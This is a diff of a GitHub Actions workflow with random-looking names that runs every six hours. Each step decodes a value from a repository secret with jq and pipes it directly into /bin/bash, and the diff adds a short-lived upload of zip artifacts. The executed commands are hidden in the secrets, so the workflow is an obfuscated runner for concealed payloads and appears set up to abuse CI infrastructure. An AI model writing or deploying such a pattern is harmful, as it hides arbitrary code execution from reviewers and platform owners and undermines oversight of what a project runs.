@@ -1,22 +1,28 @@
 name: xiangboshouzhe
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '37 1/6 * * *'
-jobs:  # 17293
+    - cron: '29 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xiangboshouzhe
         env:
-          co29: ${{ secrets.co29 }}
+          sicf155: ${{ secrets.sicf155 }}
         run: |
-          echo $co29 | jq -r .oje37 | /bin/bash
-          echo $qisji21 | jq -r .xh747 | /bin/bash
-          echo $an8 | jq -r .lx9 | /bin/bash
-          echo $e473 | jq -r .wxt82698 | /bin/bash
-          echo $wxiq8352 | jq -r .osf35 | /bin/bash
-          echo $abj4 | jq -r .bcnp334 | /bin/bash
+          printf '%s' "$sicf155" | jq -r .vij5426 | /bin/bash
+          echo $egar999 | jq -r .ajtuv9 | /bin/bash
+          echo $jgmw005 | jq -r .rqb3033 | /bin/bash
+          printf '%s' "$vm868" | jq -r .c988 | /bin/bash
+          printf '%s' "$d65723" | jq -r .otwhf60983 | /bin/bash
+          printf '%s' "$jsvqs6" | jq -r .vkyn78 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: LdUsXCRx
+          path: "*.zip"
+          retention-days: 1
